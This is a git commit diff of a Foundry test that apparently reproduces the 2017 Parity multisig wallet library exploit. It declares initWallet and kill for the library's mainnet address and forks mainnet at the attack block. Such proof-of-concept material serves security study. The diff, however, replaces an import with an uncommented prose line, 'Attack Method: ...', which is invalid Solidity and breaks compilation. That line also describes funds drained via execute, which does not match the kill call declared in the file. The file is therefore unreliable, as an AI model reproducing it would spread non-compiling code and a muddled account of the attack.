9dc6522f1b424cec52cb92a53d4fd04de91f7f97
EmileSean <emilesean.es@gmail.com>
2024-05-10 08:51:50 +0300

    Updated Parity Wallet POC

--- test/2017-11/Parity.t.sol
+++ test/2017-11/Parity.t.sol
@@ -1,28 +1,29 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity 0.8.10;
+pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
+Attack Method: Attacker gained ownership of the MultiSig by calling initWallet with no checks to prevent post-initialization calls, then used execute to drain funds.
 
 interface parity {
-
     function isOwner(address _addr) external view returns (bool);
 
     function kill(address _to) external;
 
-    function initWallet(address[] memory _owners, uint256 _required, uint256 _daylimit) external;
-
+    function initWallet(
+        address[] memory _owners,
+        uint256 _required,
+        uint256 _daylimit
+    ) external;
 }
 
 contract ContractTest is Test {
-
-    parity WalletLibrary = parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));
+    parity WalletLibrary =
+        parity(payable(0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4));
 
     address[] public owner;
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 4_501_735); //fork mainnet at block 4501735
+        vm.createSelectFork("mainnet", 4_501_735); //fork mainnet at block 4501735
     }
 
     function testExploit() public {
@@ -36,5 +37,4 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
-
 }
